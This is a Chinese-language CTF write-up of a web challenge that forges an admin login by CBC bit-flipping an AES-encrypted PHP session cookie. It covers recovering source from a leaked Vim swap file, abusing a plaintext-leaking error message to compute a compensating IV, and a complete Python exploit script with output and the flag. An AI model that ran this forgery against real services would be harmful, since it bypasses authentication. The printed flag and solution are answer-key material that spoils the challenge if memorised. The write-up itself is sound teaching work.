---
title: "CBC 字节翻转攻击（Login Form）"
ctf: "靶场练习（题目源码路径 ~p0/infosec/web/ctf/xiaosai/index.php，疑似校内赛 xiaosai）"
date: 2026-11-07
category: web
difficulty: medium
points: 未知
flag_format: "flag{...}"
author: "CTF-NET"
---

# CBC 字节翻转攻击（Login Form）

## Summary

一道经典的 **AES-128-CBC 字节翻转（bit-flipping）** Web 题。登录后服务端把
`serialize(array('username'=>..., 'password'=>...))` 用固定密钥 CBC 加密，密文和 IV
分别放进 `cipher`、`iv` 两个 Cookie。后续请求解密 Cookie 并 `unserialize`，当
`$_SESSION['username'] === 'admin'` 时输出 flag；而 `admin` 被禁止直接登录。

解题核心：翻转密文块 0 的 5 个字节，把块 1 里的用户名 `aaaaa` 改成 `admin`；
翻转会连带把块 0 的前缀炸成垃圾导致 `unserialize` 失败，但失败分支的
`die(base64_encode($plain))` 会把解密后的明文泄露出来——用它算出「补偿 IV」恢复块 0，
再重放一次即可拿到 flag。

## 侦察

### 1. 首页与登录

```bash
curl -i http://160.202.254.160:14607/
```

```http
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Set-Cookie: PHPSESSID=bqleeeng3ltot7r157rsjs6kr0; path=/
Content-Type: text/html; charset=UTF-8
```

一个 PHP 登录表单（`Login Form`），POST 参数 `username`、`password`、`submit`。

```bash
curl -i -X POST http://160.202.254.160:14607/ -d 'username=test&password=test&submit=Login'
```

```http
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=2uajorhquuvrpdig6hbiegcjvq; path=/
Set-Cookie: iv=1JQFUpZSlFB8rRXErMlTyA%3D%3D
Set-Cookie: cipher=aN2JjD8JXdwC4CFodauBsbRIFXIdo6bvENwgM%2FVEXO5PiL0qysq%2FO9C0i8rfiwFcXEHGYW6TnXLLekaKhiQNUg%3D%3D
```

```html
<p>hello test</p><p>Only admin can see flag</p><p><a href="loginout.php">Log out</a></p>
```

关键信息：

- `iv` Cookie：base64，解码后 **16 字节**（AES 块长）。
- `cipher` Cookie：base64，解码后 **64 字节 = 4 个块**（对 `test/test` 这种短输入）。
- 页面显示 `hello {用户名}`，并提示 `Only admin can see flag` —— 目标是让解密出来的用户名为 `admin`。

### 2. 目录扫描发现源码备份

目录扫描发现 `.index.php.swp` —— Vim 未正常退出留下的交换文件，可直接下载：

```bash
curl -o index.php.swp http://160.202.254.160:14607/.index.php.swp
```

```bash
$ file index.php.swp
Vim swap file, version 7.4, pid 2498, user p0, host bogon,
file ~p0/infosec/web/ctf/xiaosai/index.php
```

16 KB，Vim 7.4 交换文件格式。恢复方法：

- 若有 Vim：`vim -r index.php.swp`；
- 或直接提取其中所有可打印 ASCII 串（Vim 7.4 的 swap 里缓冲区页按“文件尾部在前”的顺序存放，
  所以提取结果大体是源码的**逆序**，从下往上读即可还原）：

```python
import re
data = open("index.php.swp", "rb").read()
for r in re.findall(rb"[\x20-\x7e]{8,}", data):
    print(r.decode())
```

### 3. 恢复出的源码（按 swap 页逆序拼接还原）

> 说明：`.swp` 是编辑中途的旧快照，以下按页序还原；个别细节（如 flag 输出行的引号）
> 与线上实际运行的 `index.php` 可能略有差异，但整体逻辑已由实测行为验证。

```php
<?php
session_start();
define("METHOD", "aes-128-cbc");
define("SECRET_KEY", file_get_contents('/root/key'));   // 固定密钥，攻击者不可知

function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));                   // 每次登录随机 IV
    }
    return $random_iv;
}

function login($info){
    $iv = get_random_iv();
    $plain = serialize($info);                          // 明文 = PHP 序列化数组
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    $_SESSION['username'] = $info['username'];
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}

function check_login(){
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            // 解密成功才继续；unserialize 失败时把解密明文 base64 泄露出来！
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");                              // padding 错误 / base64 非法
        }
    }
}

function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo '<p>Hello admin</p>';
        echo '<p>Flag is $flag</p>';                    // 线上实际会插值输出 flag
    }else{
        echo '<p>hello '.$_SESSION['username'].'</p>';
        echo '<p>Only admin can see flag</p>';
    }
    echo '<p><a href="loginout.php">Log out</a></p>';
}

if(isset($_POST['username']) && isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('<p>admin are not allowed to login</p>');  // ★ 禁止直接登录 admin
    }
    $info = array('username'=>$username,'password'=>$password);
    login($info);                                        // 加密并下发 Cookie
    show_homepage();                                     // 按 session 里刚写入的用户名回显
}else{
    if(isset($_SESSION["username"])){
        check_login();                                   // ★ 解密 Cookie 并覆盖 session
        show_homepage();
    }else{
        // 输出登录表单
    }
}
```

## 代码审计（攻击面）

画出关键流程：

```
POST username/password
   ├─ username === 'admin'  → exit("admin are not allowed to login")   ← 直接登 admin 被拦
   └─ 否则: login()   → serialize({username,password}) → AES-128-CBC(固定KEY,随机IV)
                        → Set-Cookie iv / cipher；$_SESSION['username'] = username
                        → show_homepage() → "hello xxx / Only admin can see flag"

GET（无 POST）
   ├─ $_SESSION['username'] 存在 → check_login():
   │     解密 Cookie → unserialize 成功 → $_SESSION['username'] = 解密出的用户名
   │                   → unserialize 失败 → die(泄露 base64(解密明文))   ★ 解密预言机
   │                   → 解密失败(padding错) → die("ERROR!")
   │     → show_homepage()：username === 'admin' → 输出 flag
   └─ 无 session → 登录表单（根本不碰 Cookie）
```

三个决定性结论：

1. **flag 的判定完全由解密后的 Cookie 决定**（`$_SESSION['username'] = $info['username']`），
   所以只要伪造出解密后 `username === 'admin'` 的密文即可。
2. **`die()` 泄露解密明文**：任何能通过 padding 校验、但过不了 `unserialize` 的密文，
   其解密结果会被 base64 打印出来 —— 等于免费送了一个「解密预言机」，
   这是本题能一步补偿 IV 的关键。
3. **无 session 时不会调用 `check_login()`**：攻击请求必须携带登录时拿到的 `PHPSESSID`，
   否则只会返回登录表单。

## 明文格式推导

`login()` 的明文是 `serialize(array('username'=>u,'password'=>p))`，
即 PHP 序列化串：

```
a:2:{s:8:"username";s:N:"<u>";s:8:"password";s:M:"<p>";}
```

用不同长度的输入实测 `cipher` 的字节数（base64 解码后），与序列化长度 + PKCS7 填充对照：

| username | password | 序列化明文长度 | PKCS7 后长度 | 实测 cipher 长度 |
|---|---|---|---|---|
| `a` | `b` | 52 | 64 (4 块) | 64 ✓ |
| `a`×15 | `b` | 67 | 80 (5 块) | 80 ✓ |
| `a`×16 | `b` | 68 | 80 | 80 ✓ |
| `a`×17 | `b` | 69 | 80 | 80 ✓ |
| `a`×32 | `b` | 84 | 96 (6 块) | 96 ✓ |
| `test` | `test` | 60 | 64 | 64 ✓ |

（`a:2:{`=5，`s:8:"username";`=15，`s:N:"…";`=6+N+2，`s:8:"password";`=15，`}`=1）

完全吻合 —— 明文格式确认。

### 字节布局（username=`aaaaa`, password=`ppppp`，明文 60 字节 → 填充 4 字节 → 64 字节）

```
明文:      a:2:{s:8:"userna me";s:5:"aaaaa";s:8:"password";s:5:"ppppp";}\x04\x04\x04\x04
偏移:      0         1         2         3         4         5         6
           0123456789012345678901234567890123456789012345678901234567890123
块划分:    |------ P0 ------|------ P1 ------|------ P2 ------|---- P3 ----|
           ^                ^                ^                ^
           0                16               32               48

P0 = a:2:{s:8:"userna          (字节 0~15)
P1 = me";s:5:"aaaaa";          (字节 16~31)   ★ username 值 = P1 偏移 9~13 = 字节 25~29
P2 = s:8:"password";s          (字节 32~47)
P3 = :5:"ppppp";} + 4字节填充    (字节 48~63)
```

关键坐标：**username 的值永远从明文第 25 字节开始**（前缀
`a:2:{s:8:"username";s:5:"` 固定 24 字节），即**块 1 的偏移 9~13**。
这个位置在块 0 之后，所以只能用「翻转密文块 0」来改它，而无法用 IV（IV 只影响块 0）。

## CBC 字节翻转原理

设 `E()/D()` 为 AES 分组加解密，`IV = C[-1]`：

```
加密:  C[i] = E(P[i] ^ C[i-1])
解密:  P[i] = D(C[i]) ^ C[i-1]
```

由此得出翻转规律：

| 操作 | 效果 |
|---|---|
| 翻转 `IV[j]` 的若干位 | 只翻转 `P0[j]` 的同位，其余块不受影响（**可控且干净**） |
| 翻转 `C[i-1][j]` 的若干位 | `P[i][j]` 同位翻转（**可控**）；同时 `D(C[i-1])` 整体雪崩 → **`P[i-1]` 变成随机垃圾（不可控）** |

所以想改块 1 里的用户名，只能翻 `C0`，代价是块 0 前缀 `a:2:{s:8:"userna` 被炸掉，
`unserialize` 必然失败。解法就是把「垃圾块 0」用泄露出来的结果算回去：

1. 用翻转后的 `C0'` + 原 IV 发请求 → 解密得 `P0' = 垃圾`，`P1' = me";s:5:"admin";`，
   `unserialize` 失败 → `die()` 泄露 `L = P0' ‖ P1' ‖ …`（base64）。
2. 由解密式 `P0' = D(C0') ^ IV_old` 反推 `D(C0') = P0' ^ IV_old`。
3. 构造补偿 IV：`IV_new = D(C0') ^ P0_want = IV_old ^ P0' ^ P0_want`，
   其中 `P0_want = b'a:2:{s:8:"userna'`（合法前缀）。
4. 用 `C0'` + `IV_new` 重放 → 块 0 恢复为合法前缀、块 1 用户名是 `admin`，
   `unserialize` 成功 → `$_SESSION['username']='admin'` → flag。

### 翻转字节的 Δ 计算

目标把 `aaaaa` 变成 `admin`，逐字符异或：

| 位置（C0 偏移） | 明文原字节 | 目标字节 | Δ = 原 ^ 目标 |
|---|---|---|---|
| 9 | `a` 0x61 | `a` 0x61 | `0x00` |
| 10 | `a` 0x61 | `d` 0x64 | `0x05` |
| 11 | `a` 0x61 | `m` 0x6d | `0x0c` |
| 12 | `a` 0x61 | `i` 0x69 | `0x08` |
| 13 | `a` 0x61 | `n` 0x6e | `0x0f` |

```python
DELTA = bytes([0x00, 0x05, 0x0c, 0x08, 0x0f])
for k in range(5):
    C0[9 + k] ^= DELTA[k]
```

注意用户名长度必须 ≥ 5（`admin` 是 5 字符），且翻转不能改变序列化的长度字段
（`s:5:` 保持 5），所以选了 5 字符的 `aaaaa` 来翻转。

## 完整利用脚本

```python
# -*- coding: utf-8 -*-
"""14607 CBC 字节翻转攻击 — 完整求解脚本（Python 3 + curl）"""
import subprocess, re, base64, urllib.parse

HOST = "http://160.202.254.160:14607"
P0_WANT = b'a:2:{s:8:"userna'                     # 想恢复的合法块0前缀（16字节）
DELTA   = bytes([0x00, 0x05, 0x0c, 0x08, 0x0f])   # 'aaaaa' -> 'admin'

def req(method, data=None, cookies=None):
    args = ["curl", "-s", "-i", "-m", "15", "-X", method, HOST + "/"]
    if data:    args += ["-d", data]
    if cookies: args += ["-H", "Cookie: " + cookies]
    r = subprocess.run(args, capture_output=True)   # ★ bytes 模式，见踩坑1
    headers, _, body = r.stdout.partition(b"\r\n\r\n")
    return headers.decode("latin-1"), body.decode("latin-1")

def parse_login(headers):
    sid = iv = ci = None
    for line in headers.splitlines():
        if line.startswith("Set-Cookie: PHPSESSID="):
            sid = line.split("=", 1)[1].split(";")[0]
        if line.startswith("Set-Cookie: iv="):
            iv = urllib.parse.unquote(line.split("=", 1)[1].split(";")[0])
        if line.startswith("Set-Cookie: cipher="):
            ci = urllib.parse.unquote(line.split("cipher=", 1)[1].split(";")[0])
    return sid, iv, ci

def cookie_str(sid, iv_b64, ci_b64):               # ★ base64 必须 quote，见踩坑2
    return (f"PHPSESSID={sid}; iv={urllib.parse.quote(iv_b64, safe='')}; "
            f"cipher={urllib.parse.quote(ci_b64, safe='')}")

# 1) 登录 aaaaa（username=admin 会被服务端拦截，改用等长的 aaaaa 再翻转）
headers, body = req("POST", "username=aaaaa&password=ppppp&submit=Login")
sid, iv, ci = parse_login(headers)
assert "hello aaaaa" in body, "登录未成功"

ivb = base64.b64decode(iv)
cb  = bytearray(base64.b64decode(ci))
assert len(cb) == 64

# 2) 翻转 C0[9..13]：块1中 username 值 'aaaaa' -> 'admin'（块0 前缀随之变垃圾）
for k in range(5):
    cb[9 + k] ^= DELTA[k]
ci2 = base64.b64encode(bytes(cb)).decode()

# 3) 带 session 重放 -> unserialize 失败 -> die 泄露 base64(解密明文)
_, body = req("GET", cookies=cookie_str(sid, iv, ci2))
leaked = base64.b64decode(re.search(r"base64_decode\('([A-Za-z0-9+/=]+)'\)", body).group(1))
assert leaked[16:32] == b'me";s:5:"admin";', "P1 未按预期翻转"

# 4) 补偿 IV：IV_new = IV_old ^ P0_garbage ^ P0_want
iv_new = bytes(a ^ b ^ c for a, b, c in zip(ivb, leaked[:16], P0_WANT))
iv_new_b64 = base64.b64encode(iv_new).decode()

# 5) 重放 -> 块0 恢复合法、username=admin -> 输出 flag
_, body = req("GET", cookies=cookie_str(sid, iv_new_b64, ci2))
print(re.search(r"flag\{[^}]+\}", body).group(0))
```

### 实际运行输出

```
[+] iv=474453bab4b9cf201afdbf0db2d5eac2 cipher=64B
[+] 泄露明文(60B): b'\x05qh&~\xf3$\xfb\x16\x7f\xc5\x1a(\xeb\xa4jme";s:5:"admin";s:8:"password";s:5:"ppppp";}'
[+] P1 应为 me";s:5:"admin"; -> 实际: b'me";s:5:"admin";'
[+] 补偿 IV: Iw8JprE50eM2oA9k/0wgyQ==
[*] 最终响应尾部:
  <p>Hello admin</p><p>Flag is flag{9e4027f5873f7263fc1e3177df08ddd4}</p>
[FLAG] Flag is flag{9e4027f5873f7263fc1e3177df08ddd4}
```

泄露出的 60 字节正是完整解密明文（PKCS7 填充已被 `openssl_decrypt` 剥掉）：
前 16 字节是垃圾块 0，`me";s:5:"admin";` 是翻转后的块 1 —— 与预期完全一致。

## 实战踩坑记录（环境坑，值得记）

### 坑 1：Windows 下 `subprocess(text=True)` 把 `\r\n` 转成 `\n`

```python
r = subprocess.run(..., text=True)
headers, _, body = r.stdout.partition("\r\n\r\n")   # 永远匹配不到！
```

Windows 的通用换行转换让 HTTP 头尾分隔符 `\r\n\r\n` 消失，`body` 恒为空串，
一度误判为“服务器节流/空响应”绕了很多弯路。

**正确做法**：`capture_output=True`（bytes 模式）+ `partition(b"\r\n\r\n")`，
再各自 `decode()`。

### 坑 2：PHP 的 `$_COOKIE` 会自动 urldecode，base64 里的 `+` 会变空格

服务端 `setcookie()` 时把 base64 做了 URL 编码（`+`→`%2B`、`/`→`%2F`、`=`→`%3D`）。
回放 Cookie 时若直接发原始 base64，PHP 把 `+` 解码成空格 → `base64_decode` 出错 →
`openssl_decrypt` 失败 → `die("ERROR!")`。

**正确做法**：发送前对 base64 值 `urllib.parse.quote(v, safe='')`；
取回 `Set-Cookie` 时先 `urllib.parse.unquote()` 再 base64 解码。

## 扩展思考

- **为什么必须带 `PHPSESSID`**：无 session 的请求直接走表单分支，`check_login()`
  根本不会执行，Cookie 再对也没用。攻击链是「登录建 session → 带 session 重放伪造 Cookie」。
- **为什么选 5 字符用户名**：`admin` 长 5，翻转不能改长度字段（`s:5:`），
  所以用等长串 `aaaaa` 逐字符异或；若目标比原值短，可以改长度字段 + 吞掉后续字符，
  但本题等长最简单。
- **若没有 `die()` 泄露怎么办**：块 0 被炸后 `unserialize` 失败，本题靠泄露一步补偿。
  更一般场景下可用 **padding oracle**（`ERROR!` vs 其他响应）逐字节恢复中间值
  `D(C0')`，再算补偿 IV，思路相同，只是多一轮盲测。
- **flag 输出行的引号**：`.swp` 快照里是 `echo '<p>Flag is $flag</p>';`（单引号不插值），
  但线上实际能打印出真实 flag，说明线上 `index.php` 与快照存在细微差异
  （swap 是编辑中途的旧状态），审计时要意识到这一点。

## Flag

```
flag{9e4027f5873f7263fc1e3177df08ddd4}
```
